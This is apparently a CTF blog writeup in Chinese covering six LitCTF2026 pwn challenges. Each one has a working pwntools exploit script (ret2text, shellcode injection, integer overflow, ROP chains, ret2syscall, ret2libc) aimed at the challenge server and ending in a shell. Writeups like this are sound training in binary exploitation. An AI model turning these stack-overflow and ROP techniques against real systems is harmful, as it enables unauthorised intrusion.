---
title: LitCTF Pwn Writeup
index: true
icon: codicon:note
category:
  - CTF
  - Writeup
tag:
  - CTF
  - Pwn
---
好久没打Pwn了，手感差了很多。

## Pwn

### [LitCTF2026] lit_ret2text32

很基础的32位ret2text pwn。栈大小0x38，加一个4字节大的rbp，总共要填充0x3C个垃圾数据。后门函数地址在0x08049213。思路：填满栈后填入后门函数地址即可。

```python
from pwn import *

#p = process("./LitCTF2026-pwn-ret2text32_attachment/ret2text32")
p = remote("challenge.cyclens.tech", 31560)

offset = 0x38 + 4
backdoor = p32(0x08049213)
ret = p32(0x0804923D)

payload = b"A" * offset + backdoor
p.sendline(payload)

p.interactive()
```

### [LitCTF2026] lit_ret2shellcode

没开NX，栈可执行。栈大小0x70+8，且给了栈地址。思路：填入shellcode，然后用垃圾字符填满剩下的栈，rip覆盖为栈地址即可。

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"

p = process("./ret2shellcode")
p = remote("challenge.cyclens.tech", 32662)

offset = 0x78

shellcode = asm(shellcraft.sh())

p.recvuntil(b"Here is a hint for you: buf is at ")

addr = p64(int(p.recvline().strip().ljust(8, b"\x00"), 16))

payload = shellcode + b"A" * (offset - len(shellcode)) + addr

p.sendline(payload)

p.interactive()
```

### [LitCTF2026] lit_integer_overflow

整数溢出，填入-1即可实现4GB的读。之后按照ret2text的思路进行即可。
```python
from pwn import *

p = process("./integer_overflow")
p = remote("challenge.cyclens.tech", 32713)

offset = 72
backdoor = 0x4011D7
ret = 0x40101A

p.sendafter(b"(0-63): ", b"-1\n")

payload = b"A" * offset + p64(ret) + p64(backdoor)
p.send(payload)

p.interactive()
```

### [LitCTF2026] lit_ropchain

ROP链构造。思路：填满栈->搓一个read读/bin/sh\x00到bss上，然后system执行。

```python
from pwn import *

context.arch = "amd64"
context.log_level = "info"

elf = ELF("./ropchain")

io = remote("challenge.cyclens.tech", 32038)
# io = process('./ropchain')

pop_rdi  = 0x401166
pop_rsi  = 0x40116b
pop_rdx  = 0x401170
ret      = 0x40101A
read_plt = elf.plt["read"]
system_plt = elf.plt["system"]
bss_buf  = elf.symbols["bss_buf"]
offset   = 72  # buf[64] + saved rbp[8]

# read(0, bss_buf, 8) then system(bss_buf)
rop = flat(
    pop_rdi, 0,
    pop_rsi, bss_buf,
    pop_rdx, 8,
    read_plt,
    pop_rdi, bss_buf,
    system_plt,
)

io.recvuntil(b"Input: ")
io.send(b"A" * offset + rop)
sleep(0.5)
io.send(b"/bin/sh\x00")

io.interactive()
```

### [LitCTF2026] lit_ret2syscall32

32位的syscall，其实做法与ROP差不多。

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./ret2syscall32', checksec=False)

context.binary = elf
context.arch = 'i386'
context.log_level = 'info'

HOST, PORT = 'challenge.cyclens.tech', 32446

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process('./ret2syscall32')

pop_eax      = 0x80491a6
pop_ebx      = 0x80491ab
pop_ecx_ebx  = 0x80491b0  # pop ecx; pop ebx; ret
pop_edx      = 0x80491b6
mov_edx_eax  = 0x80491bb  # mov [edx], eax; ret
int_0x80     = 0x80491c1

data_buf     = 0x804b3a0  # writable .data buffer

OFFSET = 76

io = conn()
io.recvuntil(b'Input: ')

payload  = b'A' * OFFSET

# Write "/bin" to data_buf
payload += p32(pop_edx)
payload += p32(data_buf)
payload += p32(pop_eax)
payload += b'/bin'
payload += p32(mov_edx_eax)

# Write "/sh\x00" to data_buf+4
payload += p32(pop_edx)
payload += p32(data_buf + 4)
payload += p32(pop_eax)
payload += b'/sh\x00'
payload += p32(mov_edx_eax)

# Set up execve registers
payload += p32(pop_eax)
payload += p32(11)           # SYS_execve
payload += p32(pop_edx)
payload += p32(0)            # edx = NULL (envp)
payload += p32(pop_ecx_ebx)
payload += p32(0)            # ecx = NULL (argv)
payload += p32(data_buf)     # ebx = "/bin/sh"
payload += p32(int_0x80)

io.send(payload)
io.interactive()
```

### [LitCTF2026] lit_ret2libc

有一个专门用来泄露地址的函数leak_value，可以把puts丢进去泄露地址来反推libc，之后直接去libc里system即可。

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./ret2libc', checksec=False)
libc = ELF('/usr/lib/libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

HOST, PORT = 'challenge.cyclens.tech',30743

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process('./ret2libc')

pop_rdi  = 0x4011b7
xor_rax  = 0x4011bc
ret      = 0x40101a

OFFSET = 72

io = conn()
io.recvuntil(b'name: ')

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['vuln'])

io.send(payload)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f'puts leak: {hex(leak)}')

libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

io.recvuntil(b'name: ')

payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

io.send(payload)
io.interactive()
```